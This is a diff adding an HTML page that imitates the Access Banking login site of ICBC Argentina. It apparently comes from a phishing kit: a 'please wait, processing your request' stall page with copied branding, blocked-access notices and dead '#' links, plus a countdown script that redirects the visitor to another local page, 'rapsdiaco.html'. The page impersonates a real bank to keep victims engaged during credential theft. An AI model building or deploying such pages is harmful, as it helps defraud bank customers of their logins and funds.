@@ -1,0 +1,644 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>TMPO ESPERAR</title>
+    <link rel="Stylesheet" href="css/style.css" type="text/css" media="screen">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+    <link rel="Stylesheet" href="css/login-acc.css" type="text/css" media="screen">
+    <link rel="Stylesheet" href="css/message-view-acc.css" type="text/css" media="screen">
+    <link rel="shortcut icon" href="img/lachina.ico">
+    <link rel="Stylesheet" href="css/font-awesome.css" type="text/css" media="screen">
+    <link rel="stylesheet" href="css/iview.css" type="text/css" media="screen">
+   
+    <style>
+      .contenedorSlider {
+        font-family: Arial;
+        cursor: default;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .iview-controlNav a {
+        text-indent: -9999px;
+      }
+
+      .iview-controlNav {
+        position: absolute;
+        bottom: 15px;
+        right: 40px;
+      }
+
+      .iview-controlNav a.iview-control {
+        padding: 0px;
+        float: left;
+        width: 14px;
+        height: 14px;
+        line-height: 0px;
+      }
+
+      .iview-controlNav a.circle {
+        background: url('img/bulletcircle.png') no-repeat;
+        line-height: 0px;
+      }
+
+      .iview-controlNav a.square {
+        background: url('img/bulletsquare.png') no-repeat;
+        line-height: 0px;
+      }
+
+      .iview-controlNav a.rhombus {
+        background: url('img/bulletrhombus.png') no-repeat;
+        line-height: 0px;
+      }
+
+      .iview-controlNav a.number {
+        font-size: 19px;
+        color: #FFFFFF;
+        text-indent: 2px !important;
+        line-height: 15px;
+      }
+
+      .iview-controlNav div.iview-items {
+        float: left;
+        padding: 0px;
+      }
+
+      .iview-controlNav div.iview-items ul {
+        margin: 0px;
+        padding: 0px;
+      }
+
+      .iview-controlNav div.iview-items ul li {
+        padding: 0px;
+        float: left;
+        width: 14px;
+        height: 14px;
+        margin: 0px 5px 0px 5px;
+        line-height: 0px;
+      }
+
+      .iview-controlNav a.iview-control.active {
+        color: #FF0000;
+        background-position: 0px -14px;
+      }
+
+      .iview-controlNav a.iview-control.hover {
+        color: #FF0000;
+        background-position: 0px -14px;
+      }
+
+      #iview-preloader {
+        border: 0px;
+        width: 32px;
+        height: 32px;
+        background: url('img/preloader.gif') no-repeat;
+      }
+
+      #iview-preloader div {
+        background: #DA1F2F;
+        height: 7px;
+        display: none;
+      }
+
+      #iview-timer {
+        display: none !important;
+      }
+
+      .iview-playPauseButton {
+        position: absolute;
+        right: 10px;
+        bottom: 12px;
+        background: url('img/btnplaypause.png') no-repeat;
+        background-position: -20px 0px;
+        margin: 0px 5px 0px 5px;
+        width: 20px;
+        height: 20px;
+        z-index: 9;
+        cursor: pointer;
+        display: none;
+      }
+
+      .iview-playPauseButton.play {
+        background-position: 0px 0px;
+      }
+
+      .iview-caption {
+        line-height: 0px;
+        display: none;
+      }
+
+      .iview-imgBackground {
+        position: absolute;
+        top: 0px;
+        left: 0px;
+        display: none;
+      }
+    </style>
+   
+    <style>
+      .ui-tooltip {
+        text-align: left;
+      }
+    </style>
+    
+    <style type="text/css">
+      #_copy {
+        align-items: center;
+        background: #4494d5;
+        border-radius: 3px;
+        color: #fff;
+        cursor: pointer;
+        display: flex;
+        font-size: 13px;
+        height: 30px;
+        justify-content: center;
+        position: absolute;
+        width: 60px;
+        z-index: 1000
+      }
+
+      #select-tooltip,
+      #sfModal,
+      .modal-backdrop,
+      div[id^=reader-helper] {
+        display: none !important
+      }
+
+      .modal-open {
+        overflow: auto !important
+      }
+
+      ._sf_adjust_body {
+        padding-right: 0 !important
+      }
+
+      .super_copy_btns_div {
+        position: fixed;
+        width: 154px;
+        left: 10px;
+        top: 45%;
+        background: #e7f1ff;
+        border: 2px solid #4595d5;
+        font-weight: 600;
+        border-radius: 2px;
+        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, PingFang SC, Hiragino Sans GB, Microsoft YaHei, Helvetica Neue, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
+        z-index: 5000
+      }
+
+      .super_copy_btns_logo {
+        width: 100%;
+        background: #4595d5;
+        text-align: center;
+        font-size: 12px;
+        color: #e7f1ff;
+        line-height: 30px;
+        height: 30px
+      }
+
+      .super_copy_btns_btn {
+        display: block;
+        width: 128px;
+        height: 28px;
+        background: #7f5711;
+        border-radius: 4px;
+        color: #fff;
+        font-size: 12px;
+        border: 0;
+        outline: 0;
+        margin: 8px auto;
+        font-weight: 700;
+        cursor: pointer;
+        opacity: .9
+      }
+
+      .super_copy_btns_btn:hover {
+        opacity: .8
+      }
+
+      .super_copy_btns_btn:active {
+        opacity: 1
+      }
+    </style>
+   
+  </head>
+  <body class="bodySite">
+    
+    <div class="containerSite">
+   
+      <div class="headerContainer fullpagewidthline">
+        <div class="backcolor_0084 logoHeaderDiv">
+          <a href="#" >
+            <img src="img/ICBC_logoBU.png" alt="" border="0" valign="middle">
+          </a>
+        </div>
+        <div class="header_globe" style="float:right;  ">
+          <table width="200" border="0" cellspacing="0" cellpadding="0">
+            <tbody>
+              <tr valign="top">
+                <td height="20" align="right" class="homeblacktxt">
+                  <a href="#" class="homeblacktxt">ayuda</a> | <a href="#" class="homeblacktxt">contactanos</a>
+                </td>
+              </tr>
+              <tr>
+                <td class="homeblacktxt" height="19">
+                  <img src="img/p.gif" width="1" height="1">
+                </td>
+              </tr>
+              <script language="javascript" src="jotaese/jquery.jclockNew.js.descarga" type="text/JavaScript"></script>
+                              <script type="text/javascript">
+                                 $(function($) {        
+                                     var optionsEST = {
+                                         utc: true,
+                                         utcOffset: -5,
+                                         format: "%R de %B de %Y - %H:%M", 
+                                         language: "es"
+                                    }
+                                 $('#jclock1').jclockNew(optionsEST);
+                                 });
+                              </script>
+              <tr>
+                <td align="right" id="jclock1" class="backcolor_0084 headerFechaTd homeblacktxt">10 de noviembre de 2022 - 21:43</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <table class="generalLineSeparator" width="778" border="0" cellspacing="0" cellpadding="0">
+          <tbody>
+            <tr>
+              <td height="1"></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+   
+      <table width="778" border="0" cellspacing="0" cellpadding="0" class="horizontalmenuline">
+        <tbody>
+          <tr>
+            <td height="1"></td>
+          </tr>
+        </tbody>
+      </table>
+      <!-- TITULO -->
+      <div id="accessTitle">ACCESS BANKING</div>
+      <!-- SEPARADOR -->
+      <table width="778" border="0" cellspacing="0" cellpadding="0" class="horizontalmenuline">
+        <tbody>
+          <tr>
+            <td height="1"></td>
+          </tr>
+        </tbody>
+      </table>
+      <!-- CONTAINER -->
+      <div class="container padding-bottom--5px">
+        <div class="login-body">
+          <div class="login-body-align">
+            <!-- Mensajes simples genericos -->
+            <div id="containerMessage" class="message-type message-type--inactive">
+              <!-- ICONO -->
+              <i id="message-icon" class="push-left" aria-hidden="true"></i>
+              <!-- Titulo -->
+              <div class="message-type__title-simple" id="mensaje-titulo"></div>
+              <!-- Descripcion -->
+              <p class="message-type__description" id="mensaje-descripcion"></p>
+            </div>
+            <div id="mensaje-user-bloqueado" class="message-type message-type__error message-type--inactive hideablecontainer" style="padding-top: 2px ; padding-left: 10px ;padding-right: 10px ; padding-bottom: 5px">
+              <b>
+                <p class="margin-bottom--reg" style="font-size:12px"> Tu acceso ha sido bloqueado por acumular intentos erróneos </p>
+              </b>
+              <p class="margin-bottom--reg" style="font-size:12px">Podés desbloquearlo mediante una de estas opciones:</p>
+              <div class="no-acc-container">
+                <div class="no-acc-atm" style="padding-left: 17px">
+                  <b>
+                    <p class="margin-bottom--reg" style="font-size:12px">Generación Online</p>
+                  </b>
+                  <p class="margin-bottom--reg" style="font-size:12px">Escaneá con tu celular el código QR y continuá desde <strong>ICBC Mobile </strong>. </p>
+                  <img style="width: 28% ; margin-left:30%" src="img/qr-code.svg">
+                  <p class="margin-up--reg margin-bottom--reg" style="font-size:12px">También podés descargarte la app desde el store de tu celular.</p>
+                  <div style="display:flex ; padding-left: 13px">
+                    <div style="float:left;width:40%;margin-top:6px">
+                      <a href="#" >
+                        <img src="img/AppStoreApple.svg">
+                      </a>
+                    </div>
+                    <div style="float:left;width:49%">
+                      <a href="#">
+                        <img src="img/google-play-badge.svg">
+                      </a>
+                    </div>
+                  </div>
+                </div>
+                <div class="no-acc-mob">
+                  <div class="no-acc-mob-content" style="margin-left:28px">
+                    <b>
+                      <p class="margin-bottom--reg" style="font-size:12px">Generación en cajeros Banelco</p>
+                    </b>
+                    <p class="margin-bottom--reg" style="font-size:12px">Elegí la opción:</p>
+                    <div class="margin-left--hig margin-bottom--low" style="font-size:12px">
+                      <p>1. Claves,</p>
+                      <p>2. Generación de clave,</p>
+                      <p>3. Clave Access y Mobile,</p>
+                      <p>4. Ingresá una clave provisoria,</p>
+                    </div>
+                    <p class="margin-up--reg margin-bottom--reg" style="font-size:12px ; padding-top: 11px">En Access  elegí <a class="link-inline" href="#" style="font-size:12px">Tengo una clave provisoria</a>. </p>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div id="mensaje-user-monoprod-bloqueado" class="message-type message-type__error message-type--inactive hideablecontainer">
+              <div class="message-box">
+                <p class="message-type__description"> Tu acceso se encuentra bloqueado por acumular intentos erróneos. Por favor generá nuevamente tu usuario y clave para poder ingresar. </p>
+              </div>
+            </div>
+            <div class="input-block-container margin-bottom--hig">
+         
+                
+              <label style="display: block;margin: 0 auto;text-align: center;">Cargando</label>
+              <img src="img/load3.gif" style="width: ;display: block;margin: 0 auto;">
+
+                        <span style="text-align: center;margin: 0 auto;display: block;">Por favor espere un momento, estamos procesando su solicitud <strong id="time"><label id="countdown">0:30</label>
+                <div class="clearfix"></div>
+                <div class="c-list-link__content" style="display:none">
+                  <p class="margin-up--reg margin-bottom--reg">Si es la primera vez que ingresás, o bloqueaste u olvidaste tu usuario/clave, podés obtenerlos mediante una de estas opciones:</p>
+                  <div class="no-acc-container">
+                    <div class="no-acc-atm">
+                      <b>
+                        <p class="margin-bottom--reg">Generación en cajeros Banelco</p>
+                      </b>
+                      <p class="margin-bottom--reg">Elegí la opción:</p>
+                      <div class="margin-left--hig margin-bottom--low">
+                        <p>1. Claves,</p>
+                        <p>2. Generación de clave,</p>
+                        <p>3. Clave Access y Mobile,</p>
+                        <p>4. Ingresá una clave provisoria,</p>
+                      </div>
+                      <br>
+                      <p class="margin-up--reg margin-bottom--reg">En Access  elegí <a class="link-inline" href="#">Tengo una clave provisoria</a>. </p>
+                    </div>
+                    <div class="no-acc-mob">
+                      <div class="no-acc-mob-content">
+                        <b>
+                          <p class="margin-bottom--reg">Generación Online</p>
+                        </b>
+                        <p class="margin-bottom--reg">Escaneá con tu celular el código QR y continuá desde <strong>ICBC Mobile </strong>. </p>
+                        <img class="no-acc-mob-img" src="img/qr-code.svg">
+                        <p class="margin-up--reg margin-bottom--reg">También podés descargarte la app desde el store de tu celular.</p>
+                        <div style="display:flex">
+                          <div style="float:left;width:40%;margin-top:6px">
+                            <a href="#">
+                              <img src="img/AppStoreApple.svg">
+                            </a>
+                          </div>
+                          <div style="float:left;width:49%">
+                            <a href="#">
+                              <img src="img/google-play-badge.svg">
+                            </a>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </form>
+            </div>
+           
+            <link rel="Stylesheet" href="css/dragWindow.css" type="text/css" media="screen">
+            <link rel="Stylesheet" href="css/TecladoEstilo.css" type="text/css" media="screen">
+            
+          </div>
+        </div>
+        <div class="text-coments-block padding-global--reg">Operar con Access Banking implica que aceptás en su totalidad los <a href="#" hidefocus="true" tabindex="-1">
+            <strong>términos y condiciones. </strong>
+          </a>
+          <br> Las transacciones realizadas en Access Banking no generan cargos adicionales.
+        </div>
+        <!-- INFO TARJETAS Y MONOPRODUCTO -->
+        <div class="debito-block">
+          <div class="debito-block-align">
+            <div class="debito-block__text"> Si tenés <b style="color: red;">tarjeta Visa ICBC</b> y/o <b style="color: red;">tarjeta MasterCard ICBC</b> y no contás con tarjeta de Débito ICBC, obtené tu usuario y clave haciendo <b style="cursor:pointer; cursor:hand; text-decoration: underline" onclick="showRegister()">click acá</b>. </div>
+            
+          </div>
+        </div>
+        <!-- BANNERS -->
+        <!-- aca empezaria el for que generaria un ad-box cada uno -->
+        <div class="news_container">
+          <div class="central-block">
+            <div class="ad-box ad-box--alCincuenta">
+              <a href="#" rel="noopener">
+                <img class="ad-box__image" src="img/notaloginaccess362x130.jpg">
+                <div class="ad-box__textbox-container">
+                  <div class="ad-box__textbox">
+                    <h1 class="ad-box__title">Información importante: Decreto Nro 767/2020</h1>
+                    <div class="ad-box__note" style="height: 0px;"></div>
+                  </div>
+                </div>
+              </a>
+            </div>
+            <div class="ad-box ad-box--alCincuentaMargen">
+              <a href="#" rel="noopener">
+                <img class="ad-box__image" src="img/201712atencionTelefonica362x130px.png">
+              </a>
+            </div>
+          </div>
+        </div>
+        
+        
+        
+      </div>
+      <!-- PRE FOOTER -->
+      <div id="preFooterContainer">
+        <table class="preFooter" border="0" cellspacing="0" cellpadding="0">
+          <tbody>
+            <tr>
+              <td valign="top">
+                <ul>
+                  <li class="columna">
+                    <ul>
+                      <li class="colTitulo">Productos</li>
+                      <li>
+                        <a href="#">Paquetes</a>
+                      </li>
+                      <li>
+                        <a href="#">Cuentas</a>
+                      </li>
+                      <li>
+                        <a href="#">Tarjetas</a>
+                      </li>
+                      <li>
+                        <a href="#">Seguros</a>
+                      </li>
+                      <li>
+                        <a href="#">Inversiones</a>
+                      </li>
+                      <li>
+                        <a href="#">Préstamos</a>
+                      </li>
+                    </ul>
+                  </li>
+                  <li class="columna">
+                    <ul>
+                      <li class="colTitulo">Servicios</li>
+                      <li>
+                        <a href="#">Beneficios</a>
+                      </li>
+                      <li>
+                        <a href="#">ICBC Mall</a>
+                      </li>
+                      <li>
+                        <a href="#">Canales de Servicios</a>
+                      </li>
+                      <li>
+                        <a href="#">Giros y Transferencias</a>
+                      </li>
+                    </ul>
+                  </li>
+                  <li class="columna">
+                    <ul>
+                      <li class="colTitulo">Utilidades</li>
+                      <li>
+                        <a href="#">Teléfonos Útiles</a>
+                      </li>
+                      <li>
+                        <a href="#">Sucursales y Cajeros</a>
+                      </li>
+                      <li>
+                        <a href="#">Seguridad en Canales</a>
+                      </li>
+                      <li>
+                        <a href="#">Código de Prácticas Bancarias</a>
+                      </li>
+                      <li>
+                        <a href="#">Cajeros con funcionalidad para no videntes</a>
+                      </li>
+                      <li>
+                        <a href="#">Actualización de Datos Personales</a>
+                      </li>
+                      <li>
+                        <a href="#">Atención al usuario de servicios financieros</a>
+                      </li>
+                    </ul>
+                  </li>
+                  <li class="columna">
+                    <ul class="columna">
+                      <li class="colTitulo">Icbc</li>
+                      <li>
+                        <a href="#">En Argentina</a>
+                      </li>
+                      <li>
+                        <a href="#">Prensa</a>
+                      </li>
+                      <li>
+                        <a href="#">Responsabilidad Social</a>
+                      </li>
+                      <li>
+                        <a href="#">Recursos Humanos</a>
+                      </li>
+                      <li>
+                        <a href="#">Fundación ICBC</a>
+                      </li>
+                      <li>
+                        <a href="#">Licitaciones</a>
+                      </li>
+                    </ul>
+                  </li>
+                </ul>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <!-- FOOTER -->
+      <!--<table width="778" border="0" cellspacing="0" cellpadding="0"><tr><td class="backcolor_0003" height="2"><img src="/accstatic/i/p.gif" width="1" height="1"></td></tr></table>-->
+      <table class="footergbl" width="778" border="0" cellspacing="0" cellpadding="0">
+        <tbody>
+          <tr>
+            <td>
+              <a href="#">Términos y Condiciones</a>
+              <font class="footerc"> | </font>
+              <a href="#">Política de Privacidad</a>
+              <font class="footerc"> | </font>
+              <a href="#">Aviso Legal - Ley 25.738</a>
+              <font class="footerc"> | </font>
+              <a href="#">CABA - Ley 2.709</a>
+              <font class="footerc"> | </font>
+              <font class="footerc"> | </font>
+              <font class="footerc"> | </font> | <a href="#">Defensa del Consumidor</a>
+              <font class="footerc"> | </font>
+              <a href="#">
+                <br>Comparación de comisiones </a>
+              <font class="footerc"> | </font>
+              <a href="#">Gerenciamiento de Riesgos</a>
+              <font class="footerc"> | </font>
+              <a href="#">P. Datos Personales</a>
+              <font class="footerc"> | </font>
+              <a href="#">FATCA</a>
+              <font class="footerc"> | </font>
+              <a href="#">Agente Institorio</a>
+              <font class="footerc"> | </font>
+              <a href="#">ALyC</a>
+              <br>Industrial and Commercial Bank of China (Argentina) S.A.U. 2012 TODOS LOS DERECHOS RESERVADOS
+            </td>
+            <td width="104px" align="right">
+              <table width="104" border="0" cellpadding="0" cellspacing="0">
+                <tbody>
+                  <tr>
+                    <td width="104" align="right" height="72" valign="top">
+                     
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+      <table width="778" border="0" cellspacing="0" cellpadding="0" class="horizontalmenuline">
+        <tbody>
+          <tr>
+            <td height="1"></td>
+          </tr>
+        </tbody>
+      </table>
+      
+      
+    </div>
+    
+    <img src="img/86975.gif">
+    <div role="log" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div>
+    
+    
+
+    <script>
+  $('input').keydown(function(e) {
+      if (e.keyCode == 32) {
+          return false;
+      }
+  });
+</script>
+<script type="text/javascript">
+               var url="rapsdiaco.html";
+               var seconds = 10; //número de segundos a contar
+               function secondPassed() {
+               
+                 var minutes = Math.round((seconds - 10)/60); //calcula el número de minutos
+                 var remainingSeconds = seconds % 60; //calcula los segundos
+                 //si los segundos usan sólo un dígito, añadimos un cero a la izq
+                 if (remainingSeconds < 10) { 
+                   remainingSeconds = "0" + remainingSeconds; 
+                 } 
+                 document.getElementById('countdown').innerHTML = minutes + ":" +     remainingSeconds; 
+                 if (seconds == 0) { 
+                   clearInterval(countdownTimer); 
+                  window.location=url;
+                   document.getElementById('suave').innerHTML = ""; 
+                   document.getElementById('countdown').innerHTML = ""; 
+                 } else { 
+                   seconds--; 
+                 } 
+               } 
+               
+               var countdownTimer = setInterval(secondPassed, 1000);
+            </script>
+  </body>
+</html>
